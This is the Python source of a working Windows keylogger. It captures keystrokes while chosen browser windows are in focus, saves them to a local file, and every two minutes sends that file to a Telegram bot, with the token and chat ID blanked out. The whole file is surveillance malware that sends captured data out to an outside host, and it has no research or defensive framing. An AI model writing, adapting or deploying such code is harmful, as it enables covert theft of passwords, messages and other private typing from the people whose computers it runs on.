# Import necessary libraries
from pynput import keyboard
import requests
import re
import win32gui
import threading
import time
import queue

# Configuration
class Config:
    # List of target window titles
    target_windows = ["CC Networks — Mozilla Firefox", "youtube.com"]
    
    # Telegram bot credentials
    bot_token = '~'
    chat_id = '~'

# Global variables
stop_keylogger = False  # Flag to control the keylogger
keystroke_queue = queue.Queue()  # Queue to buffer keystrokes

# Function to check if the current window matches a target
def is_target_window(window_title):
    """
    Checks if the given window title matches any of the target windows.
    
    Parameters:
    window_title (str): The title of the current window.
    
    Returns:
    bool: True if the window title matches a target, False otherwise.
    """
    for target in Config.target_windows:
        if re.search(target, window_title, re.IGNORECASE):
            return True
    return False

# Function to get the active window title (Windows-specific)
def get_active_window_title():
    """
    Retrieves the title of the currently active window.
    
    Returns:
    str: The title of the active window.
    """
    hwnd = win32gui.GetForegroundWindow()
    title = win32gui.GetWindowText(hwnd)
    return title

# Function to send data to Telegram
def send_to_telegram(message):
    """
    Sends a message to Telegram using the configured bot.
    
    Parameters:
    message (str): The message to be sent.
    """
    url = f'https://api.telegram.org/bot{Config.bot_token}/sendMessage'
    payload = {
        'chat_id': Config.chat_id,
        'text': message
    }
    response = requests.post(url, json=payload)
    if response.status_code == 200:
        print("Message sent successfully")
    else:
        print(f"Failed to send message: {response.status_code}")
        print(response.json())  # Print the response JSON for more details

# Function to process keystrokes from the queue
def process_keystrokes():
    """
    Continuously processes keystrokes from the queue until the keylogger is stopped.
    """
    while not stop_keylogger:
        try:
            keystroke = keystroke_queue.get(timeout=1)  # Wait up to 1 second for an item
            window_title = get_active_window_title()
            if is_target_window(window_title):
                print(f"Logging: Active window '{window_title}' is in the target list.")
                print(f"Keystroke captured: {keystroke} in window: {window_title}")
                with open("keylogger.txt", "a") as f:
                    f.write(f"{keystroke}\n")
            keystroke_queue.task_done()
        except queue.Empty:
            continue

# Keylogger function
def on_press(key):
    """
    Handles key press events by adding keystrokes to the queue.
    
    Parameters:
    key: The pressed key.
    """
    global stop_keylogger
    try:
        if stop_keylogger:
            return False  # Stop the listener

        keystroke_queue.put(str(key))
    except Exception as e:
        print(f"Error: {e}")

# Function to stop the keylogger
def stop_keylogger_function():
    """
    Stops the keylogger by setting the stop flag.
    """
    global stop_keylogger
    stop_keylogger = True
    print("Keylogger stopped.")

# Function to periodically send the keylogger file to Telegram
def send_keylogger_file():
    """
    Periodically sends the contents of the keylogger file to Telegram.
    """
    while not stop_keylogger:
        time.sleep(120)  # Wait for 2 minutes
        try:
            with open("keylogger.txt", "r") as f:
                content = f.read()
                if content:
                    send_to_telegram(content)
                    # Clear the file after sending
                    with open("keylogger.txt", "w") as f:
                        f.write("")
        except Exception as e:
            print(f"Error sending keylogger file: {e}")

# Start the keylogger
def start_keylogger():
    """
    Starts the keylogger listener.
    """
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Function to handle the stop key press
def on_stop_press(key):
    """
    Handles the stop key press event.
    
    Parameters:
    key: The pressed key.
    """
    if key == keyboard.Key.esc:
        stop_keylogger_function()
        return False  # Stop the listener

# Main execution
if __name__ == "__main__":
    # Start the keylogger in a separate thread
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()

    # Start the keystroke processing in a separate thread
    processing_thread = threading.Thread(target=process_keystrokes)
    processing_thread.start()

    # Start the periodic sending thread
    sending_thread = threading.Thread(target=send_keylogger_file)
    sending_thread.start()

    # Start the stop key listener
    stop_listener = keyboard.Listener(on_press=on_stop_press)
    stop_listener.start()

    # Keep the main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Main thread interrupted. Stopping keylogger.")
        stop_keylogger_function()
        keylogger_thread.join()
        processing_thread.join()
        sending_thread.join()
        stop_listener.join()
